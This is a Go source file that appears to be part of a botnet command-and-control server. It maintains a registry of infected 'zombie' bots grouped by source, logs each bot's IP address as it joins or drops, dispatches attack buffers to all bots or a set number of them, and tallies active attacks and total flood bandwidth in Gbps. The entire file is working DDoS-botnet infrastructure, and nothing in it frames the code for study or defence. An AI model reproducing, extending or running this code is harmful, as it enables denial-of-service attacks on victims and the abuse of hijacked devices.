package main

import (
	"fmt"
	"math/rand"
	"sync/atomic"
	"time"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid            int
	count          atomic.Int64
	clients        map[int]*Bot
	addQueue       chan *Bot
	delQueue       chan *Bot
	atkQueue       chan *AttackSend
	totalCount     chan int
	cntView        chan int
	distViewReq    chan int
	distViewRes    chan map[string]int
	statsReq       chan chan StatsSnapshot
	botListReq     chan chan []BotEntry
	groupStatsReq  chan chan []GroupStat
	attackCount    int
	freeCount      int
	busyCount      int
	totalSpeedGbps float64
}

type GroupStat struct {
	Name       string  `json:"name"`
	Count      int     `json:"count"`
	TotalGbps  float64 `json:"total_gbps"`
	AvgMbps    float64 `json:"avg_mbps"`
	Delta24h   int     `json:"delta_24h"`
}

type StatsSnapshot struct {
	Zombies      int
	Free         int
	Busy         int
	ActiveAttacks int
	SpeedGbps    float64
}

func NewClientList() *ClientList {
	c := &ClientList{
		clients:     make(map[int]*Bot),
		addQueue:    make(chan *Bot, 128),
		delQueue:    make(chan *Bot, 128),
		atkQueue:    make(chan *AttackSend),
		totalCount:  make(chan int, 64),
		cntView:     make(chan int),
		distViewReq: make(chan int),
		distViewRes: make(chan map[string]int),
		statsReq:    make(chan chan StatsSnapshot),
		botListReq:  make(chan chan []BotEntry),
		groupStatsReq: make(chan chan []GroupStat),
	}
	go c.worker()
	return c
}

func (cl *ClientList) Count() int {
	cl.cntView <- 0
	return <-cl.cntView
}

func (cl *ClientList) Distribution() map[string]int {
	cl.distViewReq <- 0
	return <-cl.distViewRes
}

func (cl *ClientList) GetStats() StatsSnapshot {
	reply := make(chan StatsSnapshot, 1)
	cl.statsReq <- reply
	return <-reply
}

func (cl *ClientList) GroupStats(history map[string]int) []GroupStat {
	reply := make(chan []GroupStat, 1)
	cl.groupStatsReq <- reply
	groups := <-reply
	if history != nil {
		for i := range groups {
			groups[i].Delta24h = groups[i].Count - history[groups[i].Name]
		}
	}
	return groups
}

func (cl *ClientList) BotList() []BotEntry {
	reply := make(chan []BotEntry, 1)
	cl.botListReq <- reply
	return <-reply
}

func (cl *ClientList) AddClient(c *Bot) {
	cl.addQueue <- c
	fmt.Printf("\x1b[0;37m[\x1b[1;31mZOMBIE\x1b[0;37m] \x1b[1;31mSealed \x1b[0;37m| \x1b[1;31mIP:\x1b[0;37m %s (%s) \n", c.conn.RemoteAddr(), c.source)
}

func (cl *ClientList) DelClient(c *Bot) {
	cl.delQueue <- c
	fmt.Printf("\x1b[0;37m[\x1b[1;31mZOMBIE\x1b[0;37m] \x1b[1;31mBroken \x1b[0;37m| \x1b[1;31mIP:\x1b[0;37m %s (%s) \n", c.conn.RemoteAddr(), c.source)
}

func (cl *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	cl.atkQueue <- attack
}

func (cl *ClientList) updateStats() {
	cl.busyCount = 0
	cl.freeCount = 0
	cl.totalSpeedGbps = 0
	for _, b := range cl.clients {
		if b.busy {
			cl.busyCount++
		} else {
			cl.freeCount++
		}
		cl.totalSpeedGbps += b.speedGbps
	}
}

func (cl *ClientList) worker() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-cl.addQueue:
			cl.totalCount <- 1
			cl.uid++
			add.uid = cl.uid
			cl.clients[add.uid] = add
		case del := <-cl.delQueue:
			cl.totalCount <- -1
			delete(cl.clients, del.uid)
		case atk := <-cl.atkQueue:
			cl.attackCount++
			if atk.count == -1 {
				for _, v := range cl.clients {
					if atk.botCata == "" || atk.botCata == v.source {
						v.SetBusy(true)
						v.QueueBuf(atk.buf)
					}
				}
			} else {
				var count int
				for _, v := range cl.clients {
					if count > atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						v.SetBusy(true)
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}
			go func() {
				time.Sleep(5 * time.Second)
				cl.attackCount--
			}()
		case delta := <-cl.totalCount:
			cl.count.Add(int64(delta))
			draining := true
			for draining {
				select {
				case d := <-cl.totalCount:
					cl.count.Add(int64(d))
				default:
					draining = false
				}
			}
		case <-cl.cntView:
			cl.cntView <- int(cl.count.Load())
		case <-cl.distViewReq:
			res := make(map[string]int)
			for _, v := range cl.clients {
				res[v.source]++
			}
			cl.distViewRes <- res
		case reply := <-cl.statsReq:
			cl.updateStats()
			reply <- StatsSnapshot{
				Zombies:       int(cl.count.Load()),
				Free:          cl.freeCount,
				Busy:          cl.busyCount,
				ActiveAttacks: cl.attackCount,
				SpeedGbps:     cl.totalSpeedGbps,
			}
		case reply := <-cl.botListReq:
			var entries []BotEntry
			for _, b := range cl.clients {
				entries = append(entries, b.ToEntry())
			}
			reply <- entries
		case reply := <-cl.groupStatsReq:
			type agg struct {
				count int; gbps float64
			}
			m := make(map[string]*agg)
			for _, b := range cl.clients {
				src := b.source
				if src == "" { src = "default" }
				a, ok := m[src]
				if !ok { a = &agg{}; m[src] = a }
				a.count++; a.gbps += b.speedGbps
			}
			var gs []GroupStat
			for name, a := range m {
				avgMbps := 0.0
				if a.count > 0 { avgMbps = (a.gbps * 1000) / float64(a.count) }
				gs = append(gs, GroupStat{Name: name, Count: a.count, TotalGbps: a.gbps, AvgMbps: avgMbps})
			}
			reply <- gs
		}
	}
}
